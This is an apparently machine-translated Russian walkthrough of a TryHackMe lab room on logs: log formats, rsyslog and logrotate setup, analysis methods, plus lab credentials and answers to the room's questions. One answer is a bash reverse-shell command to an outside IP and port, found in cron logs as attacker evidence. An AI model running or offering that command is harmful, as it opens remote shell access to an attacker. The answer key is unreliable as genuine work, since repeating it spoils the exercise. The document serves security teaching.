[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)

# Комната [Intro to Logs](https://tryhackme.com/r/room/introtologs) 

Всего 7 заданий:
## Задание 1
Как мы можем определить вредоносную деятельность? Какие доказательства генерируются, когда злоумышленник нарушает 
сеть? Почему важно распознавать эти индикаторы в нашей среде? 


Журналы служат бесценными записями прошлых событий, предоставляя существенную информацию для решения этих вопросов. 
Сохраняя архив исторических действий, мы можем укрепить нашу позицию безопасности и защитить наши цифровые активы 
более эффективно.  

#### Различные типы цифровых журналов	
Всестороннее понимание журналов имеет решающее значение для выявления закономерностей и минимизации потенциальных угроз.

Поскольку ручная проверка огромного объема данных журналов, генерируемых многочисленными системами и приложениями, 
может оказаться сложной задачей, крайне важно разобраться в тонкостях анализа журналов и ознакомиться с доступными 
инструментами и методами.  

Инструменты и методы анализа журналов позволяют людям интерпретировать исторические события и устанавливать надежный 
источник исторических свидетельств, оптимизируя обработку и проверку данных журналов. Такая эффективность 
способствует быстрому обнаружению и реагированию на потенциальные инциденты или значимые события.  

Анализируя журналы как записи исторических событий, отдельные лица и организации могут получить необходимые знания, 
повысить свою общую осведомленность и готовность к самым разным ситуациям. 

#### Цели обучения

В этом зале рассказывается о том, как можно использовать журналы для регистрации действий злоумышленника, об 
инструментах и методах, необходимых для анализа журналов, а также о важности эффективного сбора и анализа журналов. 

Понять важность журналов как исторической записи активности для выявления и устранения потенциальных угроз.
Изучите различные типы журналов, механизмы ведения журналов и методы сбора данных на разных платформах.
Получите практический опыт обнаружения и уничтожения противников с помощью анализа журналов.
Рекомендуемая литература

В этой комнате основное внимание будет уделено журналам и файлам журналов с использованием виртуальной машины на 
базе Linux. Тем, кто интересуется журналами событий, специфичными для Windows, рекомендуется пройти комнату «Журналы 
событий Windows».  

Присоединяйтесь к нам в этом захватывающем путешествии, в ходе которого вы приобретете необходимые знания и опыт для 
укрепления безопасности активов на различных платформах с помощью журналов! 

### Ответьте на вопросы ниже
Я готов узнать больше о журналах.
```commandline
Ответ не нужен
```

## Задание 2
Работа с журналами: сценарий

Сценарий: Веб-сервер SwiftSpend Financial постоянно бомбардируется сканированиями от злоумышленника. Как системный 
администратор этой организации, которому поручено решить эту проблему, вы должны определить, что делает 
злоумышленник, настроив ведение журнала и проанализировав собранные журналы.  

ВАЖНО: Пользователь damianhall имеет ограниченные привилегии sudo. Выполните команду sudo -l , чтобы проверить, 
какие команды может выполнять этот пользователь. Эти ограниченные команды — все, что нужно для выполнения 
последующих задач.  

Подключение к машине

Запустите виртуальную машину в режиме разделенного экрана, нажав зеленую кнопку «Запустить машину» ниже.


#### Запустить машину
Если VM не отображается, используйте синюю кнопку Show Split View в левом верхнем углу страницы. В качестве 
альтернативы, используя учетные данные ниже, вы можете подключиться к VM через RDP или SSH. 

Учетные данные ключа THM
Имя пользователя	Дэмианхолл
Пароль	Логи321!
ИС	МАШИНА_IP
ВАЖНО: Прикрепленная виртуальная машина содержит артефакты, которые помогут нам лучше понять журналы и последствия 
их анализа для методов обнаружения и реагирования на инциденты. Работайте над последующими задачами и 
экспериментируйте с виртуальной машиной на примере случая. Эскалация привилегий НЕ является необходимой для ответа 
на вопросы в этой комнате.   

В самом сердце данных: журналы

Так же, как годичные кольца физического дерева раскрывают историю его жизни, обозначая хорошие годы густыми 
завитками и сложные годы тонкими, цифровой журнал обеспечивает историческую запись активности системы. 

Оба воплощают фундаментальный принцип роста с течением времени и служат живыми записями в своих соответствующих 
областях — физической и цифровой. 

В цифровом мире каждое взаимодействие с компьютерной системой — от попыток аутентификации, предоставления 
авторизации, доступа к файлу и подключения к сети до обнаружения системной ошибки — всегда оставляет цифровой след в 
виде журналов.  

Компоненты цифрового журнала	
Журналы — это запись событий в системе. Эти записи предоставляют подробный отчет о том, что делала система, фиксируя 
широкий спектр событий, таких как входы пользователей, доступы к файлам, системные ошибки, сетевые подключения и 
изменения в данных или конфигурациях системы.  

Хотя конкретные данные могут различаться в зависимости от типа журнала, запись в журнале обычно включает в себя 
следующую информацию: 
- Временная метка регистрации события
- Имя системы или приложения, сгенерировавшего запись журнала.
- Тип произошедшего события
- Дополнительные сведения о событии, такие как пользователь, инициировавший событие, или IP-адрес устройства, 
  сгенерировавшего событие.

Эта информация обычно хранится в файле журнала, который содержит обобщенные записи о том, что происходило в системе 
в любой момент времени. 

Однако, поскольку цифровое взаимодействие является непрерывным и динамичным, размер файла журнала может 
экспоненциально расти в зависимости от действий, регистрируемых в системе. 

Истинная сила журналов: контекстная корреляция

Одна запись журнала может показаться незначительной сама по себе. Но когда данные журнала объединяются, 
анализируются и сопоставляются с другими источниками информации, они становятся мощным инструментом расследования. 
Журналы могут отвечать на критические вопросы о событии, например:  
- Что случилось?
- Когда это произошло?
- Где это произошло?
- Кто несет ответственность?
- Были ли их действия успешными ?
- Каков был результат их действий?

Следующий гипотетический сценарий может проиллюстрировать этот аспект. Предположим, что студент якобы получил доступ 
к ненадлежащему контенту в университетской сети. Просматривая журналы, системный администратор может ответить на 
следующие вопросы:  
- Что случилось?	Подтверждено , что злоумышленник получил доступ к экземпляру GitLab компании SwiftSpend Financial.
- Когда это произошло?	Доступ начался в 22:10 в среду, 8 сентября 2023 года.
- Где это произошло?	Событие произошло с устройства с IP-адресом 10.10.133.168 в сегменте пользователей VPN (10.10.
  133.0/24).
- Кто несет ответственность?	При изучении сетевых журналов было обнаружено, что устройству, идентифицированному 
  User-Agent «Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0», был присвоен IP-адрес 10.10.133.168.
- Удалось ли им добиться успеха?	Да, поскольку API Key был обнаружен публично открытым на экземпляре GitLab. Более 
  того, журналы веб-прокси подтверждают, что устройство злоумышленника достигло gitlab.swiftspend.finance и сохранило доступ через свою загруженную веб-оболочку.
- Каков результат их действий?	Злоумышленник добился удаленного выполнения кода на  gitlab.swiftspend.finance и 
  выполнил действия после эксплуатации.
- Приведенный выше пример подчеркивает, насколько важную роль журналы играют в воссоздании полной картины события, 
  тем самым улучшая наше понимание и способность эффективно реагировать.

### Ответьте на вопросы ниже
Как зовут вашего коллегу, который оставил записку на вашем рабочем столе?

```commandline
Perry
```
Каков полный путь к предлагаемому файлу журнала для первоначального расследования?
```commandline
/var/log/gitlab/nginx/access.log
```

## Задание 3
Типы журналов

Конкретные типы журналов могут предложить уникальный взгляд на работу, производительность и безопасность системы. 
Хотя существуют различные типы журналов, мы сосредоточимся на наиболее распространенных, которые охватывают примерно 
80% типичных случаев использования.  

Ниже приведен список некоторых наиболее распространенных типов журналов:
- Экран с различными типами журналов	
- Журналы приложений: сообщения о конкретных приложениях, включая статус, ошибки, предупреждения и т. д.
- Журналы аудита: действия, связанные с эксплуатационными процедурами, имеющими решающее значение для соблюдения 
  нормативных требований.
- Журналы безопасности: события безопасности, такие как входы в систему, изменения разрешений, активность брандмауэра 
  и т. д.
- Журналы сервера: различные журналы, которые генерирует сервер, включая системные журналы, журналы событий, журналы 
  ошибок и журналы доступа.
- Системные журналы: активность ядра, системные ошибки, последовательности загрузки и состояние оборудования.
- Сетевые журналы: сетевой трафик, соединения и другие события, связанные с сетью.
- Журналы базы данных: действия в системе базы данных, такие как запросы и обновления.
- Журналы веб-сервера: запросы, обработанные веб-сервером, включая URL-адреса, коды ответов и т. д.

Понимание различных типов, форматов и стандартов журналов имеет решающее значение для практического анализа журналов.
Это позволяет аналитику эффективно анализировать, интерпретировать и получать информацию из данных журналов, 
облегчая устранение неполадок, оптимизацию производительности, реагирование на инциденты и поиск угроз.  

#### Форматы журналов

Формат журнала определяет структуру и организацию данных в файле журнала. Он определяет, как кодируются данные, как 
разграничивается каждая запись и какие поля включаются в каждую строку. Эти форматы могут сильно различаться и могут 
делиться на три основные категории: полуструктурированные, структурированные и неструктурированные. Мы рассмотрим 
эти категории и проиллюстрируем их использование примерами.

Полуструктурированные журналы: Эти журналы могут содержать структурированные и неструктурированные данные с 
предсказуемыми компонентами, вмещающими текст свободной формы. Примеры включают: 

Формат сообщений Syslog: широко распространенный протокол ведения системных и сетевых журналов.

Пример файла журнала, использующего формат Syslog
```commandline
damianhall@WEBSRV-02:~/logs$ cat syslog.txt
May 31 12:34:56 WEBSRV-02 CRON[2342593]: (root) CMD ([ -x /etc/init.d/anacron ] && if [ ! -d /run/systemd/system ]; then /usr/sbin/invoke-rc.d anacron start >/dev/null; fi)
```


Формат журнала событий Windows ( EVTX ): фирменный журнал Microsoft для систем Windows.

Пример файла журнала, использующего журнал событий Windows (EVTX) Формат
```commandline
PS C:\WINDOWS\system32> Get-WinEvent -Path "C:\Windows\System32\winevt\Logs\Application.evtx"


   ProviderName: Microsoft-Windows-Security-SPP

TimeCreated                      Id LevelDisplayName Message
-----------                      -- ---------------- -------
31/05/2023 17:18:24           16384 Information      Successfully scheduled Software Protection service for re-start
31/05/2023 17:17:53           16394 Information      Offline downlevel migration succeeded.
```

Структурированные журналы: следуя строгому и стандартизированному формату, эти журналы способствуют разбору и 
анализу. Типичные форматы структурированных журналов включают: 

Форматы с разделителями полей: значения, разделенные запятыми (CSV), и значения, разделенные табуляцией (TSV) — это 
форматы, часто используемые для табличных данных. 

Пример файла журнала в формате CSV
```commandline
damianhall@WEBSRV-02:~/logs$ cat log.csv
"time","user","action","status","ip","uri"
"2023-05-31T12:34:56Z","adversary","GET",200,"34.253.159.159","http://gitlab.swiftspend.finance:80/"
```

Нотация объектов JavaScript (JSON): известна своей читабельностью и совместимостью с современными языками 
программирования.

Пример файла журнала, использующего JSON Формат
```commandline
damianhall@WEBSRV-02:~/logs$ cat log.json
{"time": "2023-05-31T12:34:56Z", "user": "adversary", "action": "GET", "status": 200, "ip": "34.253.159.159", "uri": "http://gitlab.swiftspend.finance:80/"}

W3C Extended Log Format (ELF): Определен World Wide Web Consortium (W3C), настраиваемый для ведения журнала веб-сервера. Обычно используется веб-сервером Microsoft Internet Information Services (IIS).

Пример файла журнала, использующего расширенный формат журнала W3C (ELF)
damianhall@WEBSRV-02:~/logs$ cat elf.log
#Version: 1.0
#Fields: date time c-ip c-username s-ip s-port cs-method cs-uri-stem sc-status
31-May-2023 13:55:36 34.253.159.159 adversary 34.253.127.157 80 GET /explore 200
```

Расширяемый язык разметки (XML): гибкий и настраиваемый для создания стандартизированных форматов журналирования.

Пример файла журнала, использующего XML Формат
```commandline
damianhall@WEBSRV-02:~/logs$ cat log.xml
<log><time>2023-05-31T12:34:56Z</time><user>adversary</user><action>GET</action><status>200</status><ip>34.253.159.159</ip><url>https://gitlab.swiftspend.finance/</url></log>
```
Неструктурированные журналы: Содержащие текст в свободной форме, эти журналы могут быть богаты контекстом, но могут 
создавать проблемы при систематическом анализе. Примеры включают: 

NCSA Common Log Format (CLF): стандартизированный формат журнала веб-сервера для клиентских запросов. Обычно 
используется Apache HTTP Server по умолчанию. 

Пример файла журнала, использующего формат NCSA Common Log Format (CLF)
```commandline
damianhall@WEBSRV-02:~/logs$ cat clf.log
34.253.159.159 - adversary [31/May/2023:13:55:36 +0000] "GET /explore HTTP/1.1" 200 4886
```

NCSA Combined Log Format (Combined): расширение CLF, добавляющее такие поля, как referrer и user agent. Обычно 
используется HTTP- сервером Nginx по умолчанию. 

Пример файла журнала, использующего комбинированный формат журнала NCSA (комбинированный)
```commandline
damianhall@WEBSRV-02:~/logs$ cat combined.log
34.253.159.159 - adversary [31/May/2023:13:55:36 +0000] "GET /explore HTTP/1.1" 200 4886 "http://gitlab.swiftspend.finance/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
```

ВАЖНО: Пользовательские форматы могут быть созданы для удовлетворения конкретных приложений или вариантов 
использования. Эти форматы обеспечивают гибкость, но могут потребовать специализированных инструментов 
синтаксического анализа для эффективной интерпретации и анализа.  

#### Стандарты бревен

Стандарт журнала — это набор руководств или спецификаций, которые определяют, как журналы должны создаваться, 
передаваться и храниться. Стандарты журнала могут определять использование определенных форматов журнала, но они 
также охватывают другие аспекты журнала, такие как то, какие события должны регистрироваться, как журналы должны 
безопасно передаваться и как долго журналы должны храниться. Примеры стандартов журнала включают:
- Common Event Expression (CEE): этот стандарт, разработанныйMITRE, обеспечивает общую структуру для данных журнала, упрощая создание, передачу, хранение и анализ журналов.
- Памятка по ведению журналов OWASP : руководство для разработчиков по созданию механизмов ведения журналов 
  приложений, особенно касающихся журналов безопасности.
- Протокол Syslog: Syslog — это стандарт регистрации сообщений, позволяющий разделить программное обеспечение, 
  генерирующее сообщения, от системы, которая их хранит, и программного обеспечения, которое их анализирует и составляет отчеты.
- Специальная публикация NIST 800-92: в этой публикации описывается управление журналами компьютерной безопасности.
- Журналы Azure Monitor: рекомендации по мониторингу журналов в Microsoft Azure.
- Ведение журнала в облаке Google: рекомендации по ведению журнала на облачной платформе Google (GCP).
- Ведение журнала в облачной инфраструктуре Oracle: рекомендации по ведению журнала в облачной инфраструктуре Oracle 
  (OCI).
- Virginia Tech — Стандарт ведения журнала информационных технологий: пример обзора журнала и руководство по 
  соблюдению требований.


Контрольный список стандартов

### Ответьте на вопросы ниже
Исходя из списка типов журналов в этой задаче, какой тип журнала используется файлом журнала, указанным в примечании к задаче 2?
```commandline
Web Server Log
```
Исходя из списка форматов журнала в этом задании,  какой формат журнала используется в файле журнала,  указанном  в примечании к заданию 2?
```commandline
Combined
```

## Задание 4
#### Сбор журналов

Сбор журналов является важным компонентом анализа журналов и включает в себя агрегацию журналов из различных 
источников, таких как серверы, сетевые устройства, программное обеспечение и базы данных. 

Для того, чтобы журналы эффективно представляли хронологическую последовательность событий, крайне важно 
поддерживать точность времени системы во время регистрации. Использование сетевого протокола времени ( NTP ) 
является методом достижения этой синхронизации и обеспечения целостности временной шкалы, хранящейся в журналах.  

Поскольку это основополагающий шаг на пути к тому, чтобы у аналитика по безопасности был полный набор данных для 
анализа, ниже представлен простой пошаговый процесс достижения этого, учитывая необходимость расставить приоритеты 
при сборе на основе значимой информации:  
- Определите источники: перечислите все потенциальные источники журналов, такие как серверы, базы данных, приложения и сетевые устройства.
- Выберите сборщик журналов: выберите подходящий инструмент или программное обеспечение для сбора журналов, 
  соответствующее вашей инфраструктуре.
- Настройте параметры сбора данных: убедитесь, что включена синхронизация времени через NTP для поддержания точных 
  временных рамок, настройте параметры, чтобы определить, какие события следует регистрировать с какими интервалами, и расставьте приоритеты в зависимости от важности.

Тестовый сбор: после настройки запустите тест, чтобы убедиться, что журналы собираются надлежащим образом из всех 
источников. 
ВАЖНО: Имейте в виду, что синхронизация времени на основе NTP может оказаться невозможной для репликации с 
виртуальной машиной , поскольку у нее нет подключения к Интернету. Однако при выполнении этого на практике лучше 
всего использовать pool.ntp.org для поиска сервера NTP. Синхронизация времени может выполняться автоматически в 
системах на базе Linux или вручную, путем выполнения.  ntpdate pool.ntp.org.

Пример синхронизации времени с NTP в системе на базе Linux
```commandline
root@WEBSRV-02:~# ntpdate pool.ntp.org
12 Aug 21:03:44 ntpdate[2399365]: adjust time server 85.91.1.180 offset 0.000060 sec
root@WEBSRV-02:~# date
Saturday, 12 August, 2023 09:04:55 PM UTC
root@WEBSRV-02:~#
```

#### Управление журналами

Эффективное управление журналами гарантирует, что каждый собранный журнал хранится безопасно, организован 
систематически и готов к быстрому извлечению. Гибридный подход может обеспечить сбалансированное решение, накапливая 
все файлы журналов и выборочно обрезая их.  

После того, как вы собрали свои журналы, эффективное управление ими становится первостепенным. Для достижения этого 
можно выполнить следующие шаги: 
- Хранение: выберите безопасное решение для хранения данных, принимая во внимание такие факторы, как срок хранения и доступность.
- Организация: классифицируйте журналы по их источнику, типу или другим критериям для облегчения доступа к ним в 
  дальнейшем.
- Резервное копирование: регулярно создавайте резервные копии журналов, чтобы предотвратить потерю данных.
- Проверка: Периодически просматривайте журналы, чтобы убедиться, что они правильно хранятся и классифицируются.
#### Централизация журналов

Централизация имеет решающее значение для быстрого доступа к журналам, глубокого анализа и быстрого реагирования на 
инциденты. Единая система обеспечивает эффективное управление журналами с помощью инструментов, которые предлагают 
обнаружение в реальном времени, автоматические уведомления и бесшовную интеграцию с системами управления инцидентами.  

Централизация ваших журналов может значительно упростить доступ и анализ. Вот простой процесс для достижения этого:
- Выберите централизованную систему: выберите систему, которая объединяет журналы из всех источников, например Elastic Stack или Splunk .
- Интеграция источников: подключите все ваши источники журналов к этой централизованной системе.
- Настройте мониторинг: используйте инструменты, обеспечивающие мониторинг в режиме реального времени и оповещения о 
  определенных событиях.
- Интеграция с управлением инцидентами: убедитесь, что ваша централизованная система может беспрепятственно 
  интегрироваться со всеми имеющимися у вас инструментами или протоколами управления инцидентами.
- Практическое занятие: Сбор журналов с помощью rsyslog

Цель этого занятия — представить rsyslogи продемонстрировать, как можно улучшить централизацию и управление 
журналами. В рамках процесса сбора мы настроим rsyslogзапись всех сообщений sshd в определенный файл, например 
/var/log/websrv-02/rsyslog_sshd.log. Для этого можно выполнить следующие шаги:  
- Откройте Терминал.
- Убедитесь, что rsyslog установлен: Вы можете проверить, установлен ли rsyslog, выполнив команду:sudo systemctl 
  status rsyslog
- Создайте файл конфигурации: используйте текстовый редактор для создания следующего файла конфигурации:  gedit 
  /etc/rsyslog.d/98-websrv-02-sshd.conf, nano /etc/rsyslog.d/98-websrv-02-sshd.conf, vi /etc/rsyslog.d/98-websrv-02-sshd.conf, илиvim /etc/rsyslog.d/98-websrv-02-sshd.conf
- Добавьте конфигурацию: Добавьте следующие строки, /etc/rsyslog.d/98-websrv-02-sshd.confчтобы направить сообщения 
  sshd в определенный файл журнала:

```commandline
$FileCreateMode 0644
:programname, isequal, "sshd" /var/log/websrv-02/rsyslog_sshd.log
```

- Сохраните и закройте файл конфигурации.
- Перезапустите rsyslog: Примените изменения, перезапустив rsyslog с помощью команды:sudo systemctl restart rsyslog
- Проверьте конфигурацию: вы можете проверить работоспособность конфигурации, инициировав SSH- подключение к localhost 
через ssh localhost или проверив файл журнала через минуту или две.
- Ожидаемый вывод после настройки rsyslog для мониторинга sshd

ВАЖНО: Если удаленная пересылка журналов не настроена, для ручного сбора журналов можно использовать такие 
инструменты, как scp/ и другие.rsync 

### Ответьте на вопросы ниже
После настройки rsyslog для sshd какое имя пользователя постоянно появляется в журналах sshd в 
/var/log/websrv-02/rsyslog_sshd.log, указывая на неудачные попытки входа или брутфорс? 
```commandline
stansimon
```
Каков IP-адрес SIEM-02 на основе файла конфигурации rsyslog /etc/rsyslog.d/99-websrv-02-cron.conf, который 
используется для мониторинга сообщений cron? 
```commandline
10.10.10.101
```
На основании сгенерированных журналов в /var/log/websrv-02/rsyslog_cron.log, какая команда выполняется пользователем 
root? 
```commandline
/bin/bash -c "/bin/bash -i >& /dev/tcp/34.253.159.159/9999 0>&1"
```

## Задание 5
Хранение журналов

Журналы могут храниться в разных местах, например, в локальной системе, которая их генерирует, в централизованном 
репозитории или в облачном хранилище. 

Выбор места хранения обычно зависит от нескольких факторов:
- Полностью зеленый операционный сервер	
- Требования безопасности: обеспечение хранения журналов в соответствии с организационными или нормативными 
  протоколами безопасности.
- Требования к доступности: то, насколько быстро и кому должен быть предоставлен доступ к журналам, может влиять на 
  выбор хранилища.
- Емкость хранилища: объем генерируемых журналов может потребовать значительного пространства для хранения, что 
  влияет на выбор решения для хранения.
- Факторы стоимости: выбор между облачными или локальными решениями может зависеть от бюджета на хранение журналов.
- Нормы соответствия: Конкретные отраслевые нормы, регулирующие хранение журналов, могут влиять на выбор хранилища.
- Политика хранения: Требуемое время хранения и простота извлечения могут повлиять на процесс принятия решений.
- Планы аварийного восстановления: обеспечение доступности журналов даже в случае сбоя системы может потребовать 
  специальных решений для хранения данных.

#### Сохранение журнала

Важно понимать, что хранение журналов не бесконечно. Поэтому необходим разумный баланс между сохранением журналов 
для потенциальных будущих нужд и стоимостью хранения. Понимание концепций горячего, теплого и холодного хранения 
может помочь в принятии решения:  

- Hot Storage: Журналы за последние 3-6 месяцев , которые наиболее доступны. Скорость запроса должна быть близка к 
реальному времени, в зависимости от сложности запроса.
- Теплое хранилище: журналы от шести месяцев до двух лет , действующие как озеро данных, легкодоступные, но не такие 
  мгновенные, как горячее хранилище.
- Холодное хранение: Архивированные или сжатые журналы за 2-5 лет . Эти журналы нелегкодоступны и обычно используются 
  для ретроспективного анализа или целей определения области действия.

#### Календарь хранения журналов
Управление расходами на хранение журналов имеет решающее значение для организаций, и тщательный выбор стратегий 
«горячего», «теплого» или «холодного» хранения может помочь контролировать эти расходы.

#### Удаление журнала

Удаление журнала должно выполняться осторожно, чтобы избежать удаления журналов, которые все еще могут представлять 
ценность. Резервное копирование файлов журнала, особенно критически важных, необходимо перед удалением. 

Важно иметь четко определенную политику удаления, чтобы обеспечить соблюдение законов и правил по защите данных. 
Удаление журнала помогает: 
- Поддерживайте приемлемый размер журналов для анализа.
- Соблюдайте правила конфиденциальности, такие как GDPR, которые требуют удаления ненужных данных.
- Сохраняйте баланс затрат на хранение.
- Лучшие практики: хранение, сохранение и удаление журналов

- Определите политику хранения, сохранения и удаления данных, исходя как из потребностей бизнеса, так и из требований 
законодательства. 
- Регулярно пересматривайте и обновляйте рекомендации в соответствии с меняющимися условиями и правилами.
- Автоматизируйте процессы хранения, сохранения и удаления, чтобы обеспечить согласованность и избежать человеческих 
ошибок. 
- Шифруйте конфиденциальные журналы для защиты данных.
- Необходимо регулярно делать резервные копии, особенно перед удалением.
- Практическое занятие: Управление журналами с помощью logrotate

Целью этого мероприятия является представление logrotate инструмента, который автоматизирует ротацию, сжатие и 
управление файлами журналов, гарантируя, что файлы журналов обрабатываются систематически. Он позволяет 
автоматически ротировать, сжимать и удалять файлы журналов. Например, вот как мы можем настроить его для 
/var/log/websrv-02/rsyslog_sshd.log:   

Создайте файл конфигурации: sudo gedit /etc/logrotate.d/98-websrv-02_sshd.conf , sudo nano /etc/logrotate.
d/98-websrv-02_sshd.conf, sudo vi /etc/logrotate.d/98-websrv-02_sshd.conf, или sudo vim /etc/logrotate.d/98-websrv-02_sshd.conf
Определите настройки журнала:
```commandline
/var/log/websrv-02/rsyslog_sshd.log {
    daily
    rotate 30
    compress
    lastaction
        DATE=$(date +"%Y-%m-%d")
        echo "$(date)" >> "/var/log/websrv-02/hashes_"$DATE"_rsyslog_sshd.txt"
        for i in $(seq 1 30); do
            FILE="/var/log/websrv-02/rsyslog_sshd.log.$i.gz"
            if [ -f "$FILE" ]; then
                HASH=$(/usr/bin/sha256sum "$FILE" | awk '{ print $1 }')
                echo "rsyslog_sshd.log.$i.gz "$HASH"" >> "/var/log/websrv-02/hashes_"$DATE"_rsyslog_sshd.txt"
            fi
        done
        systemctl restart rsyslog
    endscript
}
```

Сохраните и закройте файл.
Ручное исполнение: `sudo logrotate -f /etc/logrotate.d/98-websrv-02_sshd.conf`
Ожидаемый вывод после конфигурации logrotate sshd
### Ответьте на вопросы ниже
Сколько версий старых сжатых копий файлов журнала будет храниться на основе конфигурации `logrotate /etc/logrotate.d/99-websrv-02_cron.conf?`
```commandline
24
```
Какова частота ротации журналов на основе конфигурации logrotate /etc/logrotate.d/99-websrv-02_cron.conf?
```commandline
hourly
```

## Задание 6
Журналы — это больше, чем просто записи исторических событий; они могут служить путеводным компасом. Это бесценные 
ресурсы, которые при умелом использовании могут улучшить диагностику системы, кибербезопасность и усилия по 
соблюдению нормативных требований. Их роль в ведении учета исторической активности для системы или приложения имеет 
решающее значение.   

#### Процесс анализа журнала

Анализ журнала включает в себя парсинг, нормализацию, сортировку, классификацию, обогащение, корреляцию, 
визуализацию и отчетность. Это можно сделать с помощью различных инструментов и методов, начиная от сложных систем, 
таких как Splunk и ELK, и заканчивая специальными методами, начиная от стандартных инструментов командной строки и 
заканчивая инструментами с открытым исходным кодом.

#### Представление изображения источника данных	
Источники данных

Источники данных — это системы или приложения, настроенные на регистрацию системных событий или действий пользователя. Это источник журналов.

#### Представление изображения анализа журнала	
Разбор

Парсинг — это разбиение данных журнала на более управляемые и понятные компоненты. Поскольку журналы существуют в 
разных форматах в зависимости от источника, важно разбирать эти журналы, чтобы извлечь ценную информацию. 

#### Представление логарифмической нормализации в виде изображения	
Нормализация

Нормализация — это стандартизация анализируемых данных. Она подразумевает приведение различных данных журнала к 
стандартному формату, что упрощает сравнение и анализ данных из разных источников. Это необходимо в средах с 
несколькими системами и приложениями, каждое из которых может генерировать журналы в другом формате.  

#### Изображение сортировки журнала	
Сортировка

Сортировка является важным аспектом анализа журналов, поскольку она позволяет эффективно извлекать данные и 
идентифицировать закономерности. Журналы можно сортировать по времени, источнику, типу события, серьезности и любому 
другому параметру, присутствующему в данных. Правильная сортировка имеет решающее значение для выявления тенденций и 
аномалий, которые сигнализируют об эксплуатационных проблемах или инцидентах безопасности.   

#### Представление изображения классификации журнала	
Классификация

Классификация подразумевает назначение категорий журналам на основе их характеристик. Классифицируя файлы журналов, 
вы можете быстро фильтровать и фокусироваться на тех журналах, которые наиболее важны для вашего анализа. Например, 
классификация может быть основана на уровне серьезности, типе события или источнике. Автоматическая классификация с 
использованием машинного обучения может значительно улучшить этот процесс, помогая выявлять потенциальные проблемы 
или угрозы, которые могли остаться незамеченными.    

#### Представление изображения обогащения журнала	
Обогащение

Обогащение журналов добавляет контекст в журналы, чтобы сделать их более значимыми и более простыми для анализа. Это 
может включать добавление информации, такой как географические данные, данные пользователя, разведданные об угрозах 
или даже данные из других источников, которые могут предоставить полную картину события.

Обогащение делает журналы более ценными, позволяя аналитикам принимать более обоснованные решения и точнее 
реагировать на инциденты. Как и классификация, обогащение журналов может быть автоматизировано с помощью машинного 
обучения, что сокращает время и усилия, необходимые для анализа журналов.  

#### Представление логарифмической корреляции в виде изображения	
Корреляция

Корреляция включает в себя связывание связанных записей и выявление связей между записями журнала. Этот процесс 
помогает обнаружить закономерности и тенденции, облегчая понимание сложных взаимосвязей между различными событиями 
журнала. Корреляция имеет решающее значение для определения угроз безопасности или проблем производительности 
системы, которые могут остаться незамеченными.   

#### Представление изображения визуализации журнала	
Визуализация

Визуализация представляет данные журнала в графических форматах, таких как диаграммы, графики или тепловые карты. 
Визуальное представление данных упрощает распознавание закономерностей, тенденций и аномалий. Инструменты 
визуализации предоставляют интуитивно понятный способ интерпретации больших объемов данных журнала, делая сложную 
информацию более доступной и понятной.   

#### Представление изображения отчета журнала	
Отчетность

Отчетность обобщает данные журнала в структурированные форматы для предоставления информации, поддержки принятия 
решений или соответствия требованиям. Эффективная отчетность включает создание четких и кратких сводок данных 
журнала, удовлетворяющих потребности заинтересованных сторон, таких как руководство, группы безопасности или 
аудиторы. Регулярные отчеты могут быть жизненно важны для мониторинга работоспособности системы, состояния 
безопасности и эффективности работы.    

#### Инструменты анализа журналов

Инструменты управления информацией и событиями безопасности ( SIEM ), такие как Splunk или Elastic Search, можно 
использовать для сложных задач анализа журналов. 

Однако в сценариях, где необходим немедленный анализ данных, например, во время реагирования на инциденты, системы 
на базе Linuxcat могут использовать такие инструменты по умолчанию, как , grep, sed, sort, uniq и awk, а также 
sha256sum для хеширования файлов журналов. Системы на базе Windows могут использовать EZ-Tools и командлет по 
умолчанию Get-FileHash для аналогичных целей. Эти инструменты обеспечивают быстрый разбор и анализ, что подходит для 
таких ситуаций.

Кроме того, следует соблюдать правильность сбора данных, взяв хэш-код файла журнала во время сбора , чтобы 
гарантировать его допустимость в суде. 

Поэтому крайне важно не только регистрировать события, но и обеспечивать их целостность, анализировать их и 
извлекать уроки из журналов, поскольку от этого могут зависеть безопасность и эффективность организации. 

#### Методы анализа логов

Методы анализа журналов — это методы или практики, используемые для интерпретации и получения информации из данных 
журналов. Эти методы могут варьироваться от простых до сложных и имеют жизненно важное значение для выявления 
закономерностей, аномалий и критических идей. Вот некоторые распространенные методы:  
- Распознавание образов: это включает в себя выявление повторяющихся последовательностей или тенденций в данных журнала. Оно может обнаружить регулярное поведение системы или определить необычные действия, которые могут указывать на угрозу безопасности.
- Обнаружение аномалий: Обнаружение аномалий фокусируется на выявлении точек данных, которые отклоняются от ожидаемого шаблона. Крайне важно обнаружить потенциальные проблемы или вредоносные действия на ранней стадии.
- Анализ корреляции: Сопоставление различных записей журнала помогает понять взаимосвязь между различными событиями. Это может выявить причинно-следственные связи и зависимости между компонентами системы и имеет жизненно важное значение в анализе первопричин.
- Анализ временной шкалы: Анализ журналов с течением времени помогает понять тенденции, сезонность и периодическое поведение. Это может быть важно для мониторинга производительности и прогнозирования системных нагрузок.
- Машинное обучение и ИИ: использование моделей машинного обучения может автоматизировать и улучшить различные методы анализа журналов, такие как классификация и обогащение. ИИ может предоставлять прогнозные сведения и помогать в автоматизации ответов на определенные события.
- Визуализация: Представление данных журнала с помощью графиков и диаграмм обеспечивает интуитивное понимание и быстрые выводы. Визуализация может сделать сложные данные более доступными и помочь в выявлении ключевых закономерностей и взаимосвязей.
- Статистический анализ: использование статистических методов для анализа данных журнала может обеспечить количественную информацию и помочь в принятии решений на основе данных. Регрессионный анализ и проверка гипотез могут вывести взаимосвязи и подтвердить предположения.

Эти методы могут применяться по отдельности или в сочетании, в зависимости от конкретных требований и сложности 
задачи анализа журналов. Понимание и использование этих методов может значительно повысить эффективность анализа 
журналов, что приведет к более обоснованным решениям и надежным мерам безопасности.  

#### Работа с журналами: практическое применение

Работа с журналами — сложная задача, требующая как понимания, так и манипулирования данными. В этом руководстве 
рассматриваются два сценария. Первый — обработка неразобранных необработанных файлов журналов, доступ к которым 
осуществляется напрямую через инструмент просмотра журналов с открытым исходным кодом . Этот метод позволяет 
проводить немедленный анализ без предварительной обработки, что идеально подходит для быстрых проверок или 
сохранения исходного формата.    

Второй сценарий фокусируется на создании проанализированного и консолидированного файла журнала с использованием 
инструментов Unix, таких как cat, grep, sed, sort, uniq, и awk. Он включает в себя слияние, фильтрацию и 
